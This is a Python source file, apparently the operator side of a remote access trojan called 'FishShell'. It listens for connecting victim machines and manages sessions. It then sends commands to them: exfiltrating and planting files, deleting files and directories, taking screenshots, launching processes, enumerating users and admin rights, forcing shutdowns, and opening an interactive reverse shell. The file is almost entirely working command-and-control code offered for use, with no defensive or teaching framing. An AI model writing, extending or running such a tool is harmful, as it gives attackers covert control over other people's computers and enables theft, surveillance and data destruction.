import os
import sys
import time
import pickle
import threading
import traceback
import subprocess
import globals as g
import socket as sock
from queue import Queue
from tabulate import tabulate
from datetime import datetime
import sources.functions.help as helper
from sources.functions.banner import banner
from sources.functions.generate import generate


try:
    from tabulate import tabulate
    from winotify import Notification, audio
except ModuleNotFoundError:
    print("Installing Dependencies...\n")
    subprocess.call(['pip', 'install', 'tabulate'])
    subprocess.call(['pip', 'install', 'winotify'])
    from tabulate import tabulate
    from winotify import Notification, audio
except Exception as err:
    print()
    print(err)
    print()


def create_threads():
    global shell_thread, listen_thread
    shell_thread = threading.Thread(target=call_shell)
    listen_thread = threading.Thread(target=listen)
    listen_thread.daemon = True


def call_shell():
    banner()
    shell()


def listen():
    start_server()
    accept_thread = threading.Thread(target=accept_connections)
    accept_thread.daemon = True
    accept_thread.start()
    title = "Started Listening"
    msg = f"Listening on '{host}' at port '{port}'..."
    notify(title=title, message=msg)
    ping_thread = threading.Thread(target=start_ping())
    ping_thread.daemon = True
    ping_thread.start()


def notify(title='', message=''):
    path = os.getcwd()
    path = os.path.join(path, r'.sources\FishShell.png')
    popup = Notification(app_id='FishShell',
                         title=title,
                         msg=message,
                         duration='long',
                         icon=path)
    popup.set_audio(audio.Default, loop=False)
    popup.show()


def start_server():
    try:
        global server, ping, host, port
        print()
        print("[!] Starting Server...")
        server = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
        ping = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
        print(f"[!] Binding Server to [{host}:{port}] ...")
        server.bind((host, port))
        pn_port = port+1
        ping.bind((host, pn_port))
        print("[!] Server started successfully")
        print()
        print(f"[*] Listening for incoming connections on '{host}' at port '{port}'")
        print("[*] Waiting for incoming connections...\n")
        server.listen()
        ping.listen()
    except Exception as error:
        print()
        print(traceback.format_exc())
        print()
        print(error)
        print()
        connect()


def accept_connections():
    global server
    while not till and accept:
        try:
            client, addr = server.accept()
            server.setblocking(1)
            Id = (client.recv(5120)).decode()
            platform = (client.recv(5120)).decode()
            when = datetime.now()
            all_conns[Id] = [client, addr, platform, when, None, 'Active']
            active_conns[Id] = [client, addr, platform, when, None]
            title = "New Connection!"
            msg = f"[{addr[0]}:{addr[1]}] has connected to the server"
            notify(title=title, message=msg)
        except Exception as error:
            if not till and accept:
                title = "Error While accepting Connections"
                msg = str(error)
                notify(title=title, message=msg)
    return


def start_ping():
    accept_ping_thread = threading.Thread(target=accept_ping)
    accept_ping_thread.daemon = True
    send_ping_thread = threading.Thread(target=send_ping)
    send_ping_thread.daemon = True
    accept_ping_thread.start()
    send_ping_thread.start()


def accept_ping():
    global ping
    while not till and accept:
        try:
            ping_client, addr = ping.accept()
            ping.setblocking(1)
            Id = (ping_client.recv(5120)).decode()
            all_conns[Id][-2] = ping_client
            active_conns[Id][-1] = ping_client
        except:
            print(traceback.format_exc())
    return


def send_ping():
    while not till and accept:
        current_conns = active_conns.copy()
        if not current_conns:
            continue
        close = []
        for Id in current_conns:
            if current_conns[Id][-1] is None:
                continue
            try:
                ping_client = active_conns[Id][-1]
                ping_client.send(b'ping')
                if ping_client.recv(5120) == b'true':
                    continue
                close.append(Id)
            except:
                close.append(Id)
        for Id in close:
            try:
                del active_conns[Id]
            except:
                pass
    return


def list_all_connections():
    results = [['Session ID', 'IP', 'Port', 'Platform', 'Time', 'Status']]
    for Id in all_conns:
        it = all_conns[Id]
        conn = it[0]
        try:
            conn.send(b'start')
            conn.send(b'is_alive')
            if conn.recv(1024) != b'alive':
                it[5] = 'Closed/Died'
            else:
                active_conns[Id] = [it[0], it[1], it[2], it[3], it[4]]
        except:
            it[5] = 'Closed/Died'
        connection = [str(Id), it[1][0], str(it[1][1]), it[2], it[3], it[5]]
        results.append(connection)
    print()
    print("+—————————————————————————————————+")
    print("|  <----------Clients---------->  |")
    print("+—————————————————————————————————+")
    print()
    if len(results) == 1:
        print("+----------------+")
        print("| No connections |")
        print("+----------------+")
    else:
        print(tabulate(results, headers='firstrow', tablefmt='fancy_grid'))
    print()


def list_active_connections():
    results = [['Session ID', 'IP', 'Port', 'Platform', 'Time']]
    for Id in all_conns:
        it = all_conns[Id]
        conn = it[0]
        try:
            conn.send(b'start')
            conn.send(b'is_alive')
            if conn.recv(1024) != b'alive':
                continue
        except:
            continue
        active_conns[Id] = [it[0], it[1], it[2], it[3], it[4]]
        connection = [str(Id), it[1][0], str(it[1][1]), it[2], it[3]]
        results.append(connection)
    print()
    print("+————————————————————————————————————————+")
    print("|  <----------Active_Clients---------->  |")
    print("+————————————————————————————————————————+")
    print()
    if len(results) == 1:
        print("+-----------------------+")
        print("| No Active connections |")
        print("+-----------------------+")
    else:
        print(tabulate(results, headers='firstrow', tablefmt='fancy_grid'))
    print()


def select_client(Id):
    if Id in active_conns:
        try:
            client = active_conns[Id][0]
            addr = active_conns[Id][1]
            print()
            print(f"Joined session of [{addr[0]}:{addr[1]}]")
            print()
            client.send(b'start')
            send_command(client=client, Id=Id)
        except sock.timeout:
            print()
            print("Session may have died")
            print()
        except Exception as e:
            print()
            print(e)
            print()
    elif Id in all_conns:
        print()
        print("Session was closed")
        print()
    else:
        print()
        print("Session ID not found")
        print()


def close_connection(Id):
    if Id in active_conns:
        try:
            client = active_conns[Id][0]
            addr = active_conns[Id][1]
            client.send(b'start')
            client.send(b'close')
            client.close()
            del active_conns[Id]
            print(f"Closed connection with [{addr[0]}:{addr[1]}]")
        except sock.timeout:
            print()
            print("Session may have already died")
            print()
        except exception as e:
            print()
            print(e)
            print()
    elif Id in all_conns:
        print()
        print("Session was already closed")
        print()
    else:
        print("Session ID not found")


def close_all_connections():
    for Id in active_conns:
        client = active_conns[Id][0]
        client.send(b'start')
        client.send(b'force_quit')
        client.close()
    active_conns.clear()


def quit_shell():
    for Id in active_conns:
        client = active_conns[Id][0]
        client.send(b'start')
        client.send(b'quit')
        client.close()
    active_conns.clear()


def send_file(client, path_dir=''):
    data = client.recv(5120)
    if data == b'send':
        with open(path_dir, 'rb') as file:
            data = file.read()
            client.sendall(data)
            file.close()
        time.sleep(1)
        client.send(b'<END>')
    elif data[:6] == b'Failed':
        print(data.decode())
        print()


def recv_file(client, name=''):
    with open(name, 'wb') as file:
        done = False
        file_bytes = b''
        msg = b"Specified file doesn't exist"
        client.send(b'send')
        while not done:
            data = client.recv(1024)
            if data == b'<END>':
                done = True
            elif data[:6] == b'Failed':
                print(data.decode())
                print()
                done = True
            elif data == msg:
                print(str(msg))
                done = True
            else:
                file_bytes += data
        file.write(file_bytes)
        file.close()


def get_cwd(client):
    cwd = (client.recv(10240)).decode()
    if cwd[:6] == b'Failed':
        print(cwd.decode())
        print()
        return
    print(f"Current working directory : '{cwd}'")
    print()


def list_cwd(client):
    data = client.recv(10240)
    if data[:6] == b'Failed':
        print(data.decode())
        print()
        return
    files = pickle.loads(data)
    print("Current Working Directory :  \n")
    for fil in files:
        print(fil)
    print()


def list_dir(client):
    path = input("Enter directory : ")
    print()
    client.send(path.encode())
    data = client.recv(10240)
    if data == f"'{path}' doesn't exist".encode():
        print(data.decode())
        print()
        return
    elif data[:6] == b'Failed':
        print(data.decode())
        print()
        return
    files = pickle.loads(data)
    print(f"Directory : '{path}' \n")
    for fil in files:
        print(fil)
    print()


def download(client):
    path_dir = input("Enter file path : ")
    print()
    client.send(path_dir.encode())
    name = input("Enter name (directory) for file to be saved : ")
    recv_file(client=client, name=name)
    print()
    print(f"{path_dir} saved as {name}")
    print()


def upload(client):
    name = input("Enter file path (with name) : ")
    print()
    if os.path.exists(name):
        path_dir = input("Enter directory/name to be saved in : ")
        client.send(path_dir.encode())
        send_file(client=client, path_dir=name)
        msg = (client.recv(5120)).decode()
        print()
        print(msg)
        print()
    else:
        print()
        print("Specified file not found")
        print()


def change_dir(client):
    dir_path = input("Enter directory : ")
    client.send(dir_path.encode())
    msg = (client.recv(5120)).decode()
    print()
    print(msg)
    print()


def remove(client):
    path_dir = input("Enter file path : ")
    client.send(path_dir.encode())
    msg = (client.recv(5120)).decode()
    print()
    print(msg)
    print()


def remove_dir(client):
    dir_path = input("Enter Directory : ")
    client.send(dir_path.encode())
    msg = (client.recv(5120)).decode()
    print()
    print(msg)
    print()


def open_url(client):
    url = input("Enter URL : ")
    client.send(url.encode())
    msg = (client.recv(5120)).decode()
    print()
    print(msg)
    print()


def start_process(client):
    path_dir = input("Enter file directory : ")
    client.send(path_dir.encode())
    msg = (client.recv(5120)).decode()
    print()
    print(msg)
    print()


def current_user(client):
    username = (client.recv(5120)).decode()
    print()
    print(username)
    print()


def check_admin(client):
    status = client.recv(5120).decode()
    print()
    print(status)
    print()


def list_users(client):
    users = client.recv(5120).decode()
    print()
    print(users)
    print()


def current_user_details():
    details = client.recv(5120).decode()
    print()
    print(details)
    print()


def user_details(client):
    user = input("Enter username of the user : ")
    print()
    client.send(user.encode())
    details = client.recv(5120).decode()
    print()
    print(details)
    print()


def take_screenshot(client):
    name = f"screenshot-{input('Enter name to be saved (without extension) : ')}.png"
    while True:
        path = input("Enter path to be saved in : ")
        print()
        if path == '':
            path = os.getcwd()
            path = os.path.join(path, name)
            recv_file(client=client, name=path)
            break
        elif os.path.exists(path):
            path = os.path.join(path, name)
            recv_file(client=client, name=path)
            break
        else:
            print("Specified path not found")
            print()
    print()
    print(f"Screenshot saved as {path}")
    print()


def get_shell(client, Id):
    cwd = (client.recv(5120)).decode()
    print(f"Reverse shell attained on session [{Id}]")
    print()
    print(cwd, end='')
    while not till:
        try:
            client.send(b'is_alive')
            if client.recv(5120) != b'alive':
                print()
                print("Session [{Id}] : Session died")
                print("Client closed connection")
                print()
                shell()
            command = input()
            if command in ['exit', 'quit']:
                client.send(command.encode())
                break
            elif len(command) == 0:
                client.send(b'null')
                print('sent')
            else:
                client.send(command.encode())
                output = (client.recv(10240)).decode()
                print(output, end='')
        except sock.timeout:
            print()
            print("Session may have died...Returning to shell")
            print()
            shell()
        except exception as e:
            print()
            print(e)
            print()
            print("Session may have died...Returning to shell")
            print()
            shell()
    print()


def shutdown(client):
    msg = (client.recv(5120)).decode()
    print()
    print(msg)
    print()


def restart(client):
    msg = (client.recv(5120)).decode()
    print()
    print(msg)
    print()


def logout(client):
    msg = (client.recv(5120)).decode()
    print()
    print(msg)
    print()


def send_command(client, Id):
    global till
    while not till:
        try:
            command = input(f"Session [{Id}] >>> ")
            print()
            client.send(b'is_alive')
            if client.recv(5120) != b'alive' or Id not in active_conns:
                print()
                print(f"Session [{Id}] : Session died")
                print("Client closed connection")
                print()
                break
            if command == 'cwd':
                client.send(command.encode())
                get_cwd(client=client)
            elif command == 'ls_cwd':
                client.send(command.encode())
                list_cwd(client=client)
            elif command == 'ls_dir':
                client.send(command.encode())
                list_dir(client=client)
            elif command == 'dwnld':
                client.send(command.encode())
                download(client=client)
            elif command == 'upld':
                client.send(command.encode())
                upload(client=client)
            elif command == 'chdir':
                client.send(command.encode())
                change_dir(client=client)
            elif command == 'rmv':
                client.send(command.encode())
                remove(client=client)
            elif command == 'rmv_dir':
                client.send(command.encode())
                remove_dir(client=client)
            elif command == 'opn_url':
                client.send(command.encode())
                open_url(client=client)
            elif command == 'strt_proc':
                client.send(command.encode())
                start_process(client=client)
            elif command == 'take_ss':
                client.send(command.encode())
                take_screenshot(client=client)
            elif command == 'get_shell':
                client.send(command.encode())
                get_shell(client=client, Id=Id)
            elif command == 'shut':
                client.send(command.encode())
                shutdown(client=client)
            elif command == 'restrt':
                client.send(command.encode())
                restart(client=client)
            elif command == 'logout':
                client.send(command.encode())
                logout(client=client)
            elif command == 'exit':
                client.send(command.encode())
                shell()
            else:
                print("Invalid command!")
                print(f"'{command}' isn't recognised as an internal or external command")
                print()
        except sock.timeout:
            print()
            print("Session may have died...Returning to shell")
            print()
            break
        except Exception as error:
            print()
            print(traceback.format_exc())
            print()
            print(error)
            send_command(client=client, Id=Id)


def shell():
    global till, server, host, port, accept
    while not till:
        try:
            print()
            cmnd = input("FishShell >>> ")
            if cmnd[:9] == 'set lhost':
                host = cmnd[10:]
                print()
                print(f'lhost set to --> {host}')
            elif cmnd[:9] == 'set lport':
                port = int(cmnd[10:])
                print()
                print(f'lport set to --> {port}')
            elif cmnd[:8] == 'generate':
                data = cmnd[9:]
                generate(data=data)
            elif cmnd == 'listen':
                if host == '192.168.29.17' and port == 3784:
                    print()
                    print("'lhost' and 'lport' not set, continuing with default parameters")
                    print()
                accept = True
                listen_thread.start()
                time.sleep(0.5)
            elif cmnd == 'list_active':
                list_active_connections()
            elif cmnd == 'list_all':
                list_all_connections()
            elif cmnd[:6] == 'select':
                Id = cmnd[7:]
                select_client(Id=Id)
            elif cmnd[:5] == 'close':
                if server is None:
                    print()
                    print("No active connections to close")
                    print("Enter 'listen' to start listening for connections")
                    continue
                Id = cmnd[6:]
                close_connection(Id)
            elif cmnd == 'close_all':
                if server is None:
                    print()
                    print("No active connections to close")
                    print("Enter 'listen' to start listening for connections")
                    continue
                close_all_connections()
            elif cmnd.lower() in ['exit', 'quit', 'q', 'x']:
                print()
                print("Enter 'qs' to exit/quit shell")
                print("Enter 'q!' to force quit shell and clients")
            elif cmnd == 'qs':
                till, accept = True, False
                print()
                if server is not None:
                    if len(active_conns) != 0:
                        print("Closing connections...")
                        quit_shell()
                    else:
                        print("No active connections...Closed None")
                    print("Quiting Server...\n")
                    server.close()
                print("Exit code : o")
                break
            elif cmnd == 'q!':
                till, accept = True, False
                print()
                if server is not None:
                    if len(active_conns) != 0:
                        print("Quiting clients...")
                        print("Closing connections...")
                        close_all_connections()
                    else:
                        print("No active connections...Closed None")
                    quit_shell()
                    print("Quiting Server...\n")
                    server.close()
                print("Exit code : 1")
                break
            elif cmnd[:len(cmnd)] == (len(cmnd)*' ') or cmnd == '':
                pass
            else:
                print()
                print("Invalid command!")
                print(f"Command '{cmnd}' isn't recognized")
        except Exception as error:
            print()
            print(traceback.format_exc())
            print()
            print(error)
            shell()
    return


def main():
    g.initialize()
    global threads, jobs, queue, all_conns, active_conns, till, accept, server
    threads = 2
    jobs = [1, 2]
    queue = Queue()
    all_conns = {}
    active_conns = {}
    till, accept = False, False
    server = None
    global host, port
    host, port = '192.168.29.17', 3784
    create_threads()
    shell_thread.start()
    shell_thread.join()


if __name__ == '__main__':
    main()
    sys.exit()
